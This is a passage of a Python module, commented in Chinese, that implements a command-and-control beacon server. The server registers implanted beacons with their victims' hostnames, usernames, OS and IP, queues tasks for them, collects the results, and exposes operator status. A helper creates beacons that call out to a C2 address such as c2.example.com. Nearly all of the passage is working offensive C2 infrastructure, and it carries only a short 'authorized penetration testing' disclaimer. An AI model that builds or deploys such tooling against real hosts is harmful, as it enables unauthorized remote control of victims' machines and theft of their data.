            payload: 任务载荷
            timeout: 超时时间

        Returns:
            任务 ID
        """
        task = Task.create(task_type, payload, timeout)

        with self._tasks_lock:
            if beacon_id not in self.tasks:
                self.tasks[beacon_id] = []
            self.tasks[beacon_id].append(task)

        logger.info("Task added for %s: %s", beacon_id, task.id)
        return task.id

    def get_beacons(self) -> List[BeaconInfo]:
        """获取所有 Beacon（线程安全）"""
        with self._beacons_lock:
            return [s.info for s in self._sessions.values()]

    def get_results(self, beacon_id: str) -> List[TaskResult]:
        """获取 Beacon 结果（线程安全）"""
        with self._results_lock:
            return list(self.results.get(beacon_id, []))

    def run(self) -> None:
        """运行服务器（asyncio HTTPS）"""
        try:
            from aiohttp import web
        except ImportError:
            logger.error("aiohttp 未安装，Install: pip install aiohttp")
            return

        app = web.Application()
        self._app = app

        # ---- 认证中间件 ----
        @web.middleware
        async def auth_middleware(request, handler):
            if not self._verify_api_key(request.headers):
                return web.json_response(
                    {"status": "error", "message": "unauthorized"}, status=401
                )
            return await handler(request)

        if self._api_keys:
            app.middlewares.append(auth_middleware)

        # ---- 路由处理 ----
        async def checkin(request):
            data = await request.json()
            beacon_id = data.get("beacon_id")

            if beacon_id:
                with self._beacons_lock:
                    if beacon_id in self._sessions:
                        # 重连处理 — 恢复会话
                        session = self._sessions[beacon_id]
                        if not session.connected:
                            session.mark_reconnected()
                            logger.info("Beacon 重连: %s (第 %d 次)", beacon_id, session.reconnect_count)
                        else:
                            session.info.last_seen = time.time()
                    else:
                        # 新 beacon
                        if len(self._sessions) >= self.max_beacons:
                            logger.warning("达到最大 Beacon 数量限制 (%d)，拒绝新连接", self.max_beacons)
                            return web.json_response(
                                {"status": "error", "message": "server full"}, status=503
                            )

                        info = BeaconInfo(
                            beacon_id=beacon_id,
                            hostname=data.get("hostname", ""),
                            username=data.get("username", ""),
                            os_info=data.get("os_info", ""),
                            arch=data.get("arch", ""),
                            ip_address=data.get("ip_address", ""),
                            pid=data.get("pid", 0),
                        )
                        self._sessions[beacon_id] = BeaconSession(
                            beacon_id=beacon_id, info=info
                        )
                        # 向后兼容
                        self.beacons[beacon_id] = info
                        logger.info("New beacon: %s", beacon_id)

                return web.json_response({"status": "ok", "session": beacon_id})

            return web.json_response({"status": "error"}, status=400)

        async def get_tasks(request):
            beacon_id = request.match_info["beacon_id"]

            with self._beacons_lock:
                session = self._sessions.get(beacon_id)

            if not session:
                return web.json_response({"tasks": []})

            with self._tasks_lock:
                # 从 session 获取待下发任务
                pending = session.get_pending_tasks()
                task_data = [
                    {
                        "id": t.id,
                        "type": t.type,
                        "payload": t.payload,
                        "timeout": t.timeout,
                    }
                    for t in pending
                ]

                # 同步向后兼容视图
                compat_tasks = self.tasks.get(beacon_id, [])
                compat_pending = [t for t in compat_tasks if t.priority >= 0]
                for t in compat_pending:
                    t.priority = -1

            return web.json_response({"tasks": task_data})

        async def receive_result(request):
            data = await request.json()
            beacon_id = data.get("beacon_id")

            result = TaskResult(
                task_id=data.get("task_id", ""),
                success=data.get("success", False),
                output=data.get("output"),
                error=data.get("error"),
            )

            with self._beacons_lock:
                session = self._sessions.get(beacon_id)

            if session:
                session.add_result(result)
                # 修剪结果列表
                if len(session.results) > self.max_results_per_beacon:
                    session.results = session.results[-self.max_results_per_beacon:]

            # 向后兼容
            with self._results_lock:
                if beacon_id not in self.results:
                    self.results[beacon_id] = []
                self.results[beacon_id].append(result)
                self._trim_results(beacon_id)

            logger.info("Result from %s: task %s", beacon_id, result.task_id)
            return web.json_response({"status": "ok"})

        async def server_status(request):
            """服务器状态端点（仅 operator 可访问）"""
            stats = self.get_stats()
            sessions_info = {}
            with self._beacons_lock:
                for sid, sess in self._sessions.items():
                    sessions_info[sid] = {
                        "connected": sess.connected,
                        "hostname": sess.info.hostname,
                        "username": sess.info.username,
                        "os_info": sess.info.os_info,
                        "last_seen": sess.info.last_seen,
                        "reconnect_count": sess.reconnect_count,
                        "pending_tasks": len([t for t in sess.task_queue if t.priority >= 0]),
                    }
            stats["sessions"] = sessions_info
            return web.json_response(stats)

        # 注册路由
        app.router.add_post("/api/checkin", checkin)
        app.router.add_get("/api/tasks/{beacon_id}", get_tasks)
        app.router.add_post("/api/results", receive_result)
        app.router.add_get("/api/status", server_status)

        # ---- 启动服务器 ----
        protocol = "HTTPS" if self._tls_enabled else "HTTP"
        logger.info("Beacon server starting on %s:%s (%s)", self.host, self.port, protocol)
        self._running = True

        # 启动后台清理线程
        self._cleanup_thread = threading.Thread(
            target=self._cleanup_loop, daemon=True, name="BeaconServer-Cleanup"
        )
        self._cleanup_thread.start()

        # 创建 SSL 上下文
        ssl_ctx = self._create_ssl_context()

        # 运行 aiohttp
        loop = asyncio.new_event_loop()
        self._loop = loop

        async def _start():
            runner = web.AppRunner(app)
            await runner.setup()
            self._site = web.TCPSite(runner, self.host, self.port, ssl_context=ssl_ctx)
            await self._site.start()
            logger.info("Beacon server 已启动: %s://%s:%s", protocol.lower(), self.host, self.port)

            # 保持运行直到 stop() 被调用
            while self._running:
                await asyncio.sleep(1.0)

            await runner.cleanup()

        try:
            loop.run_until_complete(_start())
        except Exception as e:
            logger.error("Beacon server 异常退出: %s", e)
        finally:
            loop.close()
            self._loop = None

    def run_async(self) -> threading.Thread:
        """异步运行服务器"""
        thread = threading.Thread(target=self.run, daemon=True)
        thread.start()
        return thread

    def stop(self) -> None:
        """停止服务器"""
        self._running = False
        logger.info("Beacon server 正在停止...")
        # 清理线程会在下一个循环自动退出
        # asyncio 事件循环会在 _running=False 后退出

    def clear_beacon(self, beacon_id: str) -> bool:
        """
        手动清理指定 Beacon（线程安全）

        Args:
            beacon_id: Beacon ID

        Returns:
            是否成功清理
        """
        removed = False

        with self._beacons_lock:
            if beacon_id in self._sessions:
                del self._sessions[beacon_id]
                removed = True
            if beacon_id in self.beacons:
                del self.beacons[beacon_id]

        with self._tasks_lock:
            self.tasks.pop(beacon_id, None)

        with self._results_lock:
            self.results.pop(beacon_id, None)

        if removed:
            logger.info("手动清理 Beacon: %s", beacon_id)

        return removed

    def get_stats(self) -> Dict[str, Any]:
        """
        获取服务器统计信息（线程安全）

        Returns:
            统计信息字典
        """
        with self._beacons_lock:
            beacon_count = len(self._sessions)
            connected_count = sum(1 for s in self._sessions.values() if s.connected)
            disconnected_count = beacon_count - connected_count

        with self._tasks_lock:
            task_count = sum(len(tasks) for tasks in self.tasks.values())

        with self._results_lock:
            result_count = sum(len(results) for results in self.results.values())

        return {
            "beacons": beacon_count,
            "connected": connected_count,
            "disconnected_waiting": disconnected_count,
            "max_beacons": self.max_beacons,
            "tasks": task_count,
            "results": result_count,
            "running": self._running,
            "tls_enabled": self._tls_enabled,
            "auth_required": self._api_keys is not None,
        }


# ==================== 便捷函数 ====================


def create_beacon(
    server: str,
    port: int = 443,
    protocol: str = "https",
    interval: float = 60.0,
    encryption_key: Optional[str] = None,
) -> Beacon:
    """
    创建 Beacon 实例

    Args:
        server: C2 服务器地址
        port: 端口
        protocol: 协议
        interval: 心跳间隔
        encryption_key: 加密密钥

    Returns:
        Beacon 实例
    """
    config = BeaconConfig(
        server=server,
        port=port,
        protocol=protocol,
        interval=interval,
        key=encryption_key.encode() if encryption_key else None,
    )
    return Beacon(config)


def start_beacon_server(
    host: str = "0.0.0.0",
    port: int = 8443,
    api_keys: Optional[List[str]] = None,
    tls_enabled: bool = True,
) -> BeaconServer:
    """
    启动 Beacon 服务器

    Args:
        host: 监听地址
        port: 监听端口
        api_keys: Operator API Key 列表
        tls_enabled: 是否启用 TLS

    Returns:
        BeaconServer 实例
    """
    server = BeaconServer(host, port, api_keys=api_keys, tls_enabled=tls_enabled)
    server.run_async()
    return server


__all__ = [
    "BeaconMode",
    "BeaconConfig",
    "Beacon",
    "BeaconSession",
    "BeaconServer",
    "create_beacon",
    "start_beacon_server",
]


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
    logger.info("Beacon Module - Lightweight C2 Beacon")
    logger.info("=" * 50)
    logger.warning("[!] This module is for authorized penetration testing only!")
    logger.info("Usage:")
    logger.info("  # Server side:")
    logger.info("  from core.c2 import start_beacon_server")
    logger.info("  server = start_beacon_server(port=8080)")
    logger.info("")
    logger.info("  # Client side:")
    logger.info("  from core.c2 import create_beacon")
    logger.info("  beacon = create_beacon('http://c2.example.com', port=8080)")
    logger.info("  beacon.run()")
